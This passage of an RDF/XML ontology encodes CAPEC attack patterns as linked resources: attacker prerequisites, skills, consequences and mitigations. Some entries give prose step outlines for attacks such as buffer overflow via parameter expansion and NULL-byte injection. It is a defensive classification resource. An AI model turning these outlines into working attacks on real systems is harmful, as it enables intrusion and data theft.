      <j.0:Resource rdf:about="http://krstProj.com/capec#::The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example  suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case  the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g.  PDF  .doc  etc.)::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker248">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#121"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack248"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::489::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must have installed test APIs and failed to secure or remove them when brought into a production environment.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::For some APIs  the attacker will need that appropriate client application that interfaces with the API. Other APIs can be executed using simple tools  such as web browsers or console windows. In some cases  an attacker may need to be able to authenticate to the target before it can access the vulnerable APIs.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use programs and products that contain cryptographic elements that have been thoroughly tested for flaws in the signature verification routines.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack246">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#475">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:473::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Signature Spoofing by Improper Validation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::327::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker115">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#456"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack115"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that when parameter expansion happens in the code that the assumptions used to determine the resulting size of the parameter are accurate and that the new size of the parameter is visible to the whole system::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack389">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#47">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:100::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Buffer Overflow via Parameter Expansion"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::119::118::130::131::74::20::680::697::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Consider parts of the program where user supplied data may be expanded by the program. Use a disassembler and other reverse engineering tools to guide the search.::STEP:2:PHASE:Experiment:DESCRIPTION:Find a place where a buffer overflow occurs due to the fact that the new expanded size of the string is not correctly accounted for by the program. This may happen perhaps when the string is copied to another buffer that is big enough to hold the original  but not the expanded string. This may create an opportunity for planting the payload and redirecting program execution to the shell code.::STEP:3:PHASE:Exploit:DESCRIPTION:Write the buffer overflow exploit. To be exploitable  the spill over amount (e.g. the difference between the expanded string length and the original string length before it was expanded) needs to be sufficient to allow the overflow of the stack return pointer (in the case of a stack overflow)  without causing a stack corruption that would crash the program before it gets to execute the shell code. Heap overflow will be more difficult and will require the attacker to get more lucky  by perhaps getting a chance to overwrite some of the accounting information stored as part of using malloc().::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Construct a &apos;code book&apos; for error messages. When using a code book  application error messages aren&apos;t generated in string or stack trace form  but are catalogued and replaced with a unique (often integer-based) value &apos;coding&apos; for the error. Such a technique will require helpdesk and hosting personnel to use a &apos;code book&apos; or similar mapping to decode application errors/logs in order to respond to them normally.::Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above &apos;code book&apos; suggestion.::Implementation: Obfuscate server fields of HTTP response.::Implementation: Hide inner ordering of HTTP response header.::Implementation: Customizing HTTP error codes such as 404 or 500.::Implementation: Hide HTTP response header software information filed.::Implementation: Hide cookie&apos;s software information filed.::Implementation: Obfuscate database type in Database API&apos;s error message.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack327"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker247">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#291"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack247"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to a DNS server that allows Zone transfers.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker114">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#452"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack114"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the hardware currently deployed at a victim location.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker424">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#426"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack424"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the incentives that would influence the actions of the specific target.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use a language or compiler that performs automatic bounds checking.::Use secure functions not vulnerable to buffer overflow.::If you have to use dangerous functions  make sure that you do boundary checking.::Compiler-based canary mechanisms such as StackGuard  ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking  it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack464"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker423">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#429"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack423"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure proper permissions are in place to prevent adversaries from altering the execution status of security tools.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack79"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker119">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#501"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack119"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::923::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have previously installed the malicious application that will run in place of the trusted activity.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary must typically overcome network and host defenses in order to place malware on the system.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Malware capable of acting on the adversary&apos;s objectives.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To limit one&apos;s exposure to this type of attack  tunnel communications through a secure proxy service.::Detection of this type of attack can be done through heuristic analysis of behavioral anomalies (a la credit card fraud detection) which can be used to identify inhuman behavioral patterns. (e.g.  spidering)::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack22"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker422">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#634"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack422"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::267::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Knowledge of the target device&apos;s or application’s vulnerabilities that can be capitalized on with malicious code. The adversary must be able to place the malicious code on the target device.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To deploy a hidden process or malware on the system to automatically collect audio and video data.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Server routines should be determined by content not determined by filename or file extension.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack215"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker118">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#651"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack118"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary typically requires physical proximity to the target&apos;s environment  whether for physical eavesdropping or for placing recording equipment. This is not always the case for software-based eavesdropping  if the adversary has the capability to install malware on the target system that can activate a microphone and record audio digitally.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::For logical eavesdropping  some equipment may be necessary (e.g.  microphone  tape recorder  etc.). For physical eavesdropping  only proximity is required.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker421">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#637">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:150::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Collect Data from Clipboard"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack421">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#637"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::267::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::267::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have a means (i.e.  a pre-installed tool or background process) by which to collect data from the clipboard and store it. That is  when the target copies data to the clipboard (e.g.  to paste into another application)  the adversary needs some means of capturing that data in a third location.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To deploy a hidden process or malware on the system to automatically collect clipboard data.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker242">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#87"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack242"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::425::285::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The forcibly browseable pages or accessible resources must be discoverable and improperly protected.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Forcibly browseable pages can be discovered by using a number of automated tools. Doing the same manually is tedious but by no means difficult.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. A directory listing is helpful  but not a requirement.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker375">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#625"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack375"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Adversaries require non-trivial technical skills to create and implement fault injection attacks on mobile devices. Although this style of attack has become easier (commercial equipment and training classes are available to perform these attacks)  they usual require significant setup and experimentation time during which physical access to the device is required. This prerequisite makes the attack challenging to perform (assuming that physical security countermeasures and monitoring are in place).:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Identify programs that may be used to acquire security tool information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack10">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#581">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:580::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Security Software Footprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker374">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#390"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack374"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker241">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#52">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Embedding NULL Bytes"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack241">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#52"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::158::172::173::171::74::20::697::707::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Identify a place in the program where user input may be used to escalate privileges by for instance accessing unauthorized file system resources through directory browsing.::STEP:2:PHASE:Explore:DESCRIPTION:An attacker realizes that there is a postfix data that gets in the way of getting to the desired resources::STEP:3:PHASE:Exploit:DESCRIPTION:An attacker then ads a postfix NULL terminator to the supplied input in order to swallow the postfixed data when the insertion is taking place. With the postfix data that got in the way of the attack gone  the doors are opened for accessing the desired resources.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::158::172::173::171::74::20::697::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The program does not properly handle postfix NULL terminators::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Directory traversal:LEVEL:Medium::SKILL:Execution of arbitrary code:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Pay attention to the fact that the resource you read from can be a replaced by a Symbolic link. You can do a Symlink check before reading the file and decide that this is not a legitimate way of accessing the resource.::Because Symlink can be modified by an attacker  make sure that the ones you read are located in protected directories.::Pay attention to the resource pointed to by your symlink links (See attack pattern named Forced Symlink race)  they can be replaced by malicious resources.::Always check the size of the input data before copying to a buffer.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard  ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking  it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack503"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Specify maximum number intermediate nodes for the request and require SSL connections with mutual authentication.::Implementation: Use SSL for connections between all parties with mutual authentication.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack331"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker240">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#397"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack240"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker373">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#277"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack373"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::707::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker371">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#107"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack371"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::693::648::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::HTTP TRACE is enabled on the web server::The destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policy::Scripting is enabled in the client&apos;s browser::HTTP is used as the communication protocol between the server and the client::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Understanding of the HTTP protocol and an ability to craft a malicious script:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker372">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#97"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack372"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::327::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target software utilizes some sort of cryptographic algorithm.::An underlying weaknesses exists either in the cryptographic algorithm used or in the way that it was applied to a particular chunk of plaintext.::The encryption algorithm is known to the attacker.::An attacker has access to the ciphertext.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Cryptanalysis generally requires a very significant level of understanding of mathematics and computation.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize  filter and white list any input that will be used in error messages.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack53"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Encrypt sensitive information when transmitted on insecure mediums to prevent interception.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack393"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Encryption of all data packets emanating from the smartphone to a retransmission device via two encrypted tunnels with Suite B cryptography  all the way to the VPN gateway at the datacenter.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack369"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker80">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#401"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack80"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker379">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#105"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack379"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::436::444::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::User-manipulateable HTTP Request headers are processed by the web server::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Good understanding of the HTTP protocol and the parsing mechanisms employed by various web servers:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A tool that allows for the sending of customized HTTP requests is required.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker246">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#475"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack246"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::327::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Recipient is using a weak cryptographic signature verification algorithm or a weak implementation of a cryptographic signature verification algorithm  or the configuration of the recipient&apos;s application accepts the use of keys generated using cryptographically weak signature verification algorithms.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Cryptanalysis of signature verification algorithm:LEVEL:High::SKILL:Reverse engineering and cryptanalysis of signature verification algorithm implementation:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker113">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#247"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack113"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::86::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use language APIs rather than relying on passing data to the operating system shell or command line. Doing so ensures that the available protection mechanisms in the language are intact and applicable.::Filter all incoming data to escape or remove characters or strings that can be potentially misinterpreted as operating system or shell commands::All application processes should be run with the minimal privileges required. Also  processes must shed privileges as soon as they no longer require them.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack407"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use browser technologies that do not allow client-side scripting.::Utilize strict type  character  and encoding enforcement.::Ensure that all user-supplied input is validated before use.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack502"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker378">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#33"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack378"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::444::436::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An additional HTTP entity such as an application firewall or a web caching proxy between the attacker and the second entity such as a web server::Differences in the way the two HTTP entities parse HTTP requests::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker has to have detailed knowledge of the HTTP protocol specifics and must also possess exact details on the discrepancies between the two targeted entities in parsing HTTP requests.:LEVEL:High::"/>
    </j.0:need>
